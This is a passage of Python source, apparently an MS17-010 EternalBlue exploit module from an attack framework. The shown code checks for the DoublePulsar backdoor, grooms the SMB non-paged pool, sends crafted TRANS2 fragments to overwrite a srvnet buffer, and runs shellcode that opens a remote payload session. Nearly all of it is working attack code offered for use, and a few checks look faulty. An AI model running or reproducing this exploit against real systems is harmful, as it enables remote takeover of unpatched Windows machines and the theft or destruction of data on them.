            SmbSession.login_standard('', '')
        except:
            print_error("Bad or unknown status returned")
            return False
        print_success("Connected to target, pinging backdoor...")

        ServerOs = SmbSession.get_server_os().__str__()
        TreeID = SmbSession.tree_connect_andx('\\\\%s\\IPC$' % TargetIp)
        #write("s")
        if ServerOs.startswith("Windows 7"):
            OsVer = "7"
        elif ServerOs.startswith("Windows 2003"):
            OsVer = "2003"
        elif ServerOs.startswith("Windows XP"):
            OsVer = "XP"
        elif ServerOs.startswith("Windows Vista"):
            OsVer = "Vista"
        elif ServerOs.startswith("2008"):
            OsVer = "2008"
        elif ServerOs.startswith("Windows 8"):
            OsVer = "8"
        else:
            OsVer = "unknown"

        if ServerOs.startswith(" Pack 1"):
            SP = "1"
        elif ServerOs.startswith(" Pack 2"):
            SP = "2"
        elif ServerOs.startswith(" Pack 3"):
            SP = "3"
        else:
            SP = "unknown"
        #write("dawdwa");
        IKey, Arch, BackdoorStaue, MultiplexID = MakeSmbTrans2DoublepulsarPing(SmbSession, TreeID, 1, b"")
        #write("s")
        if IKey == b"\x00\x00\x00\x00" and BackdoorStaue != 0x10:
            print_error('\t Packet MID is zero, backdoor not present,Game on.')
            return False
        Staue = MidStaue[RetMid[str(BackdoorStaue)]]
        print_success("\t Backdoor returned code: %s - %s!" % (Staue, RetMid[str(BackdoorStaue)]))
        key = IKey
        print_success(
            ("\t Ping returned Target architecture: %s - XOR Key: 0x%s" % (Arch, binascii.b2a_hex(key).upper())))
        print_success("SMB Connection string is: %s " % (ServerOs))
        print_success("Target OS is: %s %s" % (OsVer, Arch))
        print_success("Target SP is:" + SP)
        print_success("\t Backdoor installed")
        return True
    def Exploit(self):
        try:

            numGroomConn=11
            shellcode=self.MakeShellCode()
            target=self.Parameate['TargetIp']
            # force using smb.SMB for SMB1
            if self.Parameate["InstallDoublePulasr"]=="True":
                PingStaus=self.Ping()
                if PingStaus==True:
                    return
            print_msg("Connecting to target for exploitation.")
            try:
                conn = smb.SMB(target, target)
                conn.login_standard('', '')
            except:
                print_error("Could not make SMBv1 connection")
                self.Status=5
                return
            else:
                print_success("Connection established for exploitation.")
            # can use conn.login() for ntlmv2
            
        
            server_os = conn.get_server_os().__str__()
            count = 0
            if verify_target(server_os):
                print_success("Target OS selected valid for OS indicated by SMB reply")
            else:
                if self.Parameate['VerifyTarget']=="True":
                    print_error('Target OS selected not valid for OS indicated by SMB reply')
                    print_error('Disable VerifyTarget option to proceed manually...')
                    self.Status=134
                    return
                else:
                    pass
            #write("s")
            #chunks = os.scan(/.{1,16}/)
            #chunks.each do |chunk|
            #hexdump = chunk.chars.map { |ch| ch.ord.to_s(16).rjust(2, '0') }.join(' ')
            coun=len(server_os)/16
            print_success("CORE raw buffer dump (%d bytes)"%len(server_os))
            for hexcount in range(int(coun)+1):

                chunk=server_os[count*16:(count*16)+16]
                hexdump=bytes(server_os[count*16:(count*16)+16], encoding="utf8")
                format = '0x%08x  %-47s  %-16s'% (count * 16, str(hexstring(binascii.b2a_hex(hexdump)),'utf-8'), chunk)
                print_msg(format)
                count += 1
            #write('Target OS: '+server_os)
            
            

            tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
            print_success("Target arch selected valid for arch indicated by DCE/RPC reply")
            # The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
            # Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
            
            progress = send_big_trans2(conn, tid, 0, feaList, b'\x00'*30, 2000, False)
            # we have to know what size of NtFeaList will be created when last fragment is sent

            # make sure server recv all payload before starting allocate big NonPaged
            #sendEcho(conn, tid, 'a'*12)

            # create buffer size NTFEA_SIZE-0x1000 at server
            # this buffer MUST NOT be big enough for overflown buffer
            allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
            
            # groom nonpaged pool
            # when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
            print_msg("Trying exploit with %d Groom Allocations."%numGroomConn)
            print_msg("Sending all but last fragment of exploit packet")
            print_msg("Starting non-paged pool grooming")
            srvnetConn = []
            for i in range(numGroomConn):
                sk = createConnectionWithBigSMBFirst80(target)
                srvnetConn.append(sk)
            
            # create buffer size NTFEA_SIZE at server
            # this buffer will be replaced by overflown buffer
            print_success("Sending SMBv2 buffers")
            holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
            # disconnect allocConn to free buffer
            #print_msg("Sending all but last fragment of exploit packet")
            # expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
            allocConn.get_socket().close()
            print_success("Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.")
            print_msg("Sending final SMBv2 buffers.")
            
            # hope one of srvnetConn is next to holeConn
            for i in range(5):
                sk = createConnectionWithBigSMBFirst80(target)
                srvnetConn.append(sk)
                
            # send echo again, all new 5 srvnet buffers should be created
            #sendEcho(conn, tid, 'a'*12)
            
            # remove holeConn to create hole for fea buffer
            holeConn.get_socket().close()
            print_msg("Sending last fragment of exploit packet!")
            #print_success("Receiving response from exploit packet")
            # send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
            send_trans2_second(conn, tid, feaList[progress:], progress)
            recvPkt = conn.recvSMB()
            print_success("Receiving response from exploit packet")
            retStatus = recvPkt.getNTStatus()
            # retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag
            if retStatus == 0xc000000d:
                print_success('ETERNALBLUE overwrite completed successfully (0x{:08x})!'.format(retStatus))
            else:
                print_warning('ETERNALBLUE overwrite returned unexpected status code (0x{:08x})!'.format(retStatus))
                

            # one of srvnetConn struct header should be modified
            # a corrupted buffer will write recv data in designed memory address
            print_msg("Sending egg to corrupted connection.")
            for sk in srvnetConn:
                sk.send(fake_recv_struct + shellcode)
            print_msg("Triggering free of corrupted buffer.")
            #write("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b")
            # execute shellcode by closing srvnet connection
            for sk in srvnetConn:
                sk.close()

            # nicely close connection (no need for exploit)
            conn.disconnect_tree(tid)
            conn.logoff()
            conn.get_socket().close()
            if self.Parameate["InstallDoublePulasr"]=="True":
                PingStaus=self.Ping()
                if PingStaus==True:
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    return
                else:
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-FAL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    self.Status=5
                    return

            try:
                if self.Object.UsePayloadObject.Support==True:
                    SessionObj = Session(self.Object)
                    SessionObj.TargetOS = self.Object.UsePayloadObject.OS
                    SessionObj.PayloadType = self.Object.UsePayloadObject.Types
                    SessionObj.UUID = uuid.uuid1().__str__()
                    SessionObj.Object = self.Object.UsePayloadObject
                    print_success("UUID:%s   " % (SessionObj.UUID))

                    SessionObj.start()
                    try:
                        SessionObj.Console()
                    except Exception as error:
                        print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                        print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-FAL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                        print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                        self.Status=5
                        return
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
                    self.Object.SessionManager.update({SessionObj.UUID: SessionObj})
                    self.Object.UsePayloadObject.SetUUidSession(SessionObj.UUID)
                    return
                    #write(self.Parameate)
            except:
                pass
            print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
            print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
            print_success('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')



           
            #open("shellcode.bin","w").write(ShellCode)
            # Disable
            #StartAttack(self.Parameate["TargetIp"],ShellCode,numGroomConn)
        except Exception as error:
            write("Exploit Functon:"+error)
            print_error("MS17-010 EternalBlue Exploit failed",time=0)
        else:
            print_success("MS17-010 EternalBlue Exploit Successfully",time=0)

    def new_method(self):
        return 16
